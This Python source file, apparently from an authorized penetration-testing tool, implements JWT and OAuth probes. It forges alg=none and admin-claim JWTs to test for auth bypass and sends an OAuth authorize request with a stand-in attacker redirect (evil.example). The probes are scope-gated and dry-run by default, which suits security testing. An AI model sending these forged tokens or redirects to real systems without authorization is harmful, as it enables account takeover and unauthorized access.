"""OAuth / JWT active probes (authorized, capped, non-destructive)."""

from __future__ import annotations

import base64
import json
import urllib.parse
from pathlib import Path
from typing import Any

from .. import ui
from ..redaction import redact_text
from ..scoped_http import scoped_fetch_bytes, scoped_fetch_no_redirect
from .base import RunnerResult, require_in_scope
from .jwt_analyze import analyze_jwt, b64url_json


def _b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def jwt_active_probe(
    target_dir: Path,
    url: str,
    *,
    token: str,
    approve: bool = False,
    force: bool = False,
    timeout: float = 12.0,
) -> RunnerResult:
    """Try alg=none / role flip variants against an authenticated URL (Authorization header)."""
    require_in_scope(
        target_dir, url, action="jwt active auth bypass probe", force=force, tool="jwt_active"
    )
    analysis = analyze_jwt(token)
    plan = {
        "url": url,
        "approve": approve,
        "static_issues": analysis.get("issues") or [],
        "variants": ["alg_none", "role_admin"],
    }
    ui.code_panel(json.dumps(plan, indent=2), title="jwt_active_probe", lexer="json")
    cmd = ["jwt_active_probe", url]
    if not approve:
        ui.dry_run_banner()
        return RunnerResult(
            cmd, False, None, json.dumps({"dry_run": True, **plan, "analysis": analysis}), "", "dry-run"
        )

    raw = token.strip()
    if raw.lower().startswith("bearer "):
        raw = raw[7:].strip()
    parts = raw.split(".")
    if len(parts) < 2:
        return RunnerResult(
            cmd, True, 1, json.dumps({"ok": False, "error": "invalid jwt"}), "", "error"
        )

    try:
        header = b64url_json(parts[0])
        payload = b64url_json(parts[1])
    except Exception as exc:  # noqa: BLE001
        return RunnerResult(
            cmd, True, 1, json.dumps({"ok": False, "error": str(exc)}), "", "error"
        )

    variants: list[tuple[str, str]] = []
    # alg=none unsigned
    h_none = dict(header)
    h_none["alg"] = "none"
    tok_none = f"{_b64url(json.dumps(h_none, separators=(',', ':')).encode())}.{parts[1]}."
    variants.append(("alg_none", tok_none))
    # privileged claim flip
    p_admin = dict(payload)
    p_admin["role"] = "admin"
    p_admin["admin"] = True
    p_admin["is_admin"] = True
    tok_admin = (
        f"{parts[0]}."
        f"{_b64url(json.dumps(p_admin, separators=(',', ':')).encode())}."
        f"{parts[2] if len(parts) > 2 else ''}"
    )
    variants.append(("role_admin_keep_sig", tok_admin))

    results: list[dict[str, Any]] = []
    signal = False
    reason = "no jwt bypass signal"

    def _get(auth: str) -> tuple[int, int, str]:
        resp = scoped_fetch_bytes(
            url,
            target_dir=target_dir,
            action="jwt active auth bypass probe",
            force=force,
            timeout=timeout,
            headers={
                "User-Agent": "hackbot-jwt-active",
                "Authorization": f"Bearer {auth}",
            },
            max_bytes=60_000,
            gate_initial=False,
        )
        body = resp.body.decode("utf-8", errors="replace")
        return resp.status, len(body), body

    try:
        base_st, base_len, _ = _get(raw)
    except Exception as exc:  # noqa: BLE001
        return RunnerResult(
            cmd,
            True,
            1,
            json.dumps({"ok": False, "error": f"{type(exc).__name__}: {exc}"}),
            "",
            "error",
        )
    for label, tok in variants:
        try:
            st, ln, body = _get(tok)
        except Exception as exc:  # noqa: BLE001
            results.append({"variant": label, "error": type(exc).__name__})
            continue
        interesting = st in {200, 201} and base_st in {401, 403}
        interesting = interesting or (
            st == 200 and base_st == 200 and abs(ln - base_len) > max(50, int(base_len * 0.1))
        )
        results.append(
            {
                "variant": label,
                "status": st,
                "length": ln,
                "base_status": base_st,
                "interesting": interesting,
                "preview": redact_text(body[:120]),
            }
        )
        if interesting:
            signal = True
            reason = f"JWT variant {label} accepted differently than original"
            break

    out = {
        "ok": True,
        "url": url,
        "signal": signal,
        "reason": reason,
        "analysis": analysis,
        "results": results,
    }
    return RunnerResult(cmd, True, 0, json.dumps(out), "", "executed")


def oauth_probe(
    target_dir: Path,
    authorize_url: str,
    *,
    approve: bool = False,
    force: bool = False,
    timeout: float = 12.0,
) -> RunnerResult:
    """Passive+light OAuth authorize URL checks: state missing, redirect_uri looseness."""
    require_in_scope(
        target_dir,
        authorize_url,
        action="oauth authorize probe",
        force=force,
        tool="oauth_probe",
    )
    parsed = urllib.parse.urlparse(
        authorize_url if "://" in authorize_url else f"https://{authorize_url}"
    )
    qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    plan = {
        "url": authorize_url,
        "approve": approve,
        "checks": ["state_present", "redirect_uri_host", "response_type"],
    }
    ui.code_panel(json.dumps(plan, indent=2), title="oauth_probe", lexer="json")
    cmd = ["oauth_probe", authorize_url]

    issues: list[str] = []
    if "state" not in qs or not (qs.get("state") or [""])[0]:
        issues.append("missing state parameter (CSRF risk)")
    if "response_type" not in qs:
        issues.append("missing response_type")
    redirs = qs.get("redirect_uri") or qs.get("redirect_url") or []
    if redirs:
        ru = redirs[0]
        ru_host = urllib.parse.urlparse(ru).netloc
        if not ru_host:
            issues.append("redirect_uri is relative/empty host")
        elif "*" in ru or ru.endswith(".evil.example"):
            issues.append("redirect_uri looks overly permissive")
    else:
        issues.append("no redirect_uri in authorize URL")

    if not approve:
        ui.dry_run_banner()
        return RunnerResult(
            cmd,
            False,
            None,
            json.dumps({"dry_run": True, **plan, "static_issues": issues}),
            "",
            "dry-run",
        )

    # Live: try open redirect_uri to evil (may 400 — still informative)
    evil = "https://evil.example/callback"
    qs2 = dict(qs)
    qs2["redirect_uri"] = [evil]
    if "state" not in qs2:
        qs2["state"] = ["hackbot"]
    probe = urllib.parse.urlunparse(
        (
            parsed.scheme,
            parsed.netloc,
            parsed.path,
            "",
            urllib.parse.urlencode({k: v[0] if v else "" for k, v in qs2.items()}),
            "",
        )
    )
    status = 0
    location = ""
    hops: list[dict[str, Any]] = []
    try:
        resp = scoped_fetch_no_redirect(
            probe,
            target_dir=target_dir,
            action="oauth authorize probe",
            force=force,
            timeout=timeout,
            headers={"User-Agent": "hackbot-oauth-probe"},
            gate_initial=False,
        )
        status = resp.status
        headers = {k.lower(): v for k, v in resp.headers.items()}
        location = headers.get("location") or ""
        if not location and resp.hops:
            location = str(resp.hops[-1].get("to") or "")
        hops = list(resp.hops)
    except Exception as exc:  # noqa: BLE001
        return RunnerResult(
            cmd,
            True,
            1,
            json.dumps({"ok": False, "error": f"{type(exc).__name__}: {exc}", "static_issues": issues}),
            "",
            "error",
        )

    signal = "evil.example" in (location or "")
    if signal:
        issues.append("authorize accepted evil redirect_uri (open redirect/OAuth)")
    out = {
        "ok": True,
        "url": authorize_url,
        "probe_url": probe,
        "status": status,
        "location": redact_text(location)[:300],
        "static_issues": issues,
        "signal": signal or bool(issues),
        "redirect_hops": hops,
        "reason": (
            "evil redirect_uri accepted"
            if signal
            else ("; ".join(issues) if issues else "oauth params look ok")
        ),
        "issue_count": len(issues),
    }
    return RunnerResult(cmd, True, 0, json.dumps(out), "", "executed")
